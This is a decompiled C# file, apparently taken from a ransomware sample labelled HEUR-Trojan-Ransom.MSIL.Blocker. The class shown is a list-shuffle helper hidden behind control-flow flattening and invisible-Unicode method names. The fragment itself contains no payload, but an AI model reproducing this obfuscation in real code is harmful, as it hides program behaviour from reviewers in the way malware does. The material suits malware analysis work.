// Decompiled with JetBrains decompiler
// Type: Cytotechnologist.ScrambleExtention
// Assembly: PEFileEvidenceFacto, Version=2.0.4.0, Culture=neutral, PublicKeyToken=null
// MVID: 33D8CF26-6BC9-4426-B954-9C7650E72B0A
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.02-msil\HEUR-Trojan-Ransom.MSIL.Blocker.gen-09acaed1582d4f3da067862bc15fb60d54d8e65c2a64bd2432d354941daf716f.exe

using System;
using System.Collections.Generic;
using System.Runtime.InteropServices;

namespace Cytotechnologist
{
  public static class ScrambleExtention
  {
    private static readonly Random Random = ScrambleExtention.\u206A‎⁯‌⁫‬‭⁪⁮‏‍⁮​⁯⁫‫‌‏⁯⁭‮‎‌‭‬⁬‪⁬⁮​‎​‬‏​‮‍‫‍‏‮();

    public static void Shuffle<T>(IList<T> list)
    {
      int count = list.Count;
label_4:
      int num1 = count <= 1 ? -82517857 : (num1 = -1950212742);
      int index;
      T obj;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ -1969309629)) % 12U)
        {
          case 0:
            list[count] = obj;
            num1 = (int) num2 * 234907451 ^ -1051148204;
            continue;
          case 1:
            goto label_4;
          case 2:
            obj = list[index];
            num1 = (int) num2 * -465748510 ^ 1771636109;
            continue;
          case 3:
            num1 = (int) num2 * -972163076 ^ -793462958;
            continue;
          case 4:
            goto label_3;
          case 5:
            num1 = (int) num2 * 1834999480 ^ -502320198;
            continue;
          case 6:
            list[index] = list[count];
            num1 = (int) num2 * -236521895 ^ 240075555;
            continue;
          case 7:
            num1 = -1950212742;
            continue;
          case 8:
            --count;
            num1 = (int) num2 * -492623921 ^ -296780488;
            continue;
          case 9:
            num1 = -1267648657;
            continue;
          case 10:
            num1 = (int) num2 * 1102766491 ^ -1883947539;
            continue;
          case 11:
            index = ScrambleExtention.\u202A‏‫‮‏‬⁫⁮⁭​⁮⁬‏‫‬‫‪‭​‪‏‍‌‫‬‬⁯‍‪‮⁫‏‮⁪‭‭⁪‮‬‮(ScrambleExtention.Random, count + 1);
            num1 = (int) num2 * 1857753320 ^ 1941909385;
            continue;
          default:
            goto label_14;
        }
      }
label_3:
      return;
label_14:;
    }

    static int \u202A‏‫‮‏‬⁫⁮⁭​⁮⁬‏‫‬‫‪‭​‪‏‍‌‫‬‬⁯‍‪‮⁫‏‮⁪‭‭⁪‮‬‮([In] Random obj0, [In] int obj1) => obj0.Next(obj1);

    static Random \u206A‎⁯‌⁫‬‭⁪⁮‏‍⁮​⁯⁫‫‌‏⁯⁭‮‎‌‭‬⁬‪⁬⁮​‎​‬‏​‮‍‫‍‏‮() => new Random();
  }
}
